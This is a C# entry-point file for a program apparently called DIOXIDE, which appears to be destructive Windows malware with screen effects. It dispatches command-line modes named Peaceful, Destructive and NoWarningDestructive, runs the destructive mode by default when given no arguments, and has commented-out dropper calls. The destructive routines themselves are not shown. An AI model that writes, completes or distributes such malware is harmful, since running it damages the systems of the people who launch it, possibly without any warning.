using System;
using System.IO;
using System.Windows.Forms;
using static DIOXIDE.Functions;
using static DIOXIDE.execute;
using static DIOXIDE.Win32API;
using static DIOXIDE.destruction;

namespace DIOXIDE
{
    class main
    {
        public static IntPtr hdcDesktop;
        public static IntPtr hwndDesktop;
        public static RECT rcScrBounds;

        static void Main( string[] cmd )
        {
            Application.EnableVisualStyles();
            Initialize();

            if (cmd.Length == 0)
            {
                executeD();
                //  ExecuteDropper();
            }
            else
            {
                for (int i = 0 ; i < cmd.Length ; i++)
                {
                    if (cmd[i] == "/P")
                    {
                        executeP();
                    }
                    if (cmd[i] == "/D")
                    {
                        File.Delete( TempPath + "Dioxide.exe" );

                        executeD();
                    }
                    if (cmd[i] == "/NWD")
                    {
                        executeNWD();
                    }
                    if (cmd[i] == "/EWP")
                    {
                        executeEWP();
                    }
                    if (cmd[i] == "/help")
                    {
                        MessageBox.Show( "/P Peaceful" + Environment.NewLine + "/D Destructive" + Environment.NewLine + "/NWD NoWarningDestructive" + Environment.NewLine + "/EWP EnabledWarningPeaceful", "help", MessageBoxButtons.OK );
                    }
                    /*
                    if (cmd[i] == "/run")
                    {
                        ExecuteDropper2();
                    }
                    */
                }
            }
        }
        static void Initialize()
        {
            System.OperatingSystem os = System.Environment.OSVersion;
            if (os.Platform == PlatformID.Win32NT)
            {
                if (os.Version.Major >= 6)
                {
                    SetProcessDPIAware();
                }
            }
            hwndDesktop = IntPtr.Zero;
            hdcDesktop = GetDC( hwndDesktop );

            rcScrBounds.bottom = Screen.PrimaryScreen.Bounds.Bottom;
            rcScrBounds.top = Screen.PrimaryScreen.Bounds.Top;
            rcScrBounds.left = Screen.PrimaryScreen.Bounds.Left;
            rcScrBounds.right = Screen.PrimaryScreen.Bounds.Right;

            _CosineDoubleTable = new float[TABLE_SIZE];
            _SineDoubleTable = new float[TABLE_SIZE];

            for (int i = 0 ; i < TABLE_SIZE ; i++)
            {
                double Angle = ((double)i / TABLE_SIZE_D) * PI2;
                _SineDoubleTable[i] = (float)Math.Sin( Angle );
                _CosineDoubleTable[i] = (float)Math.Cos( Angle );
            }
        }
    }
}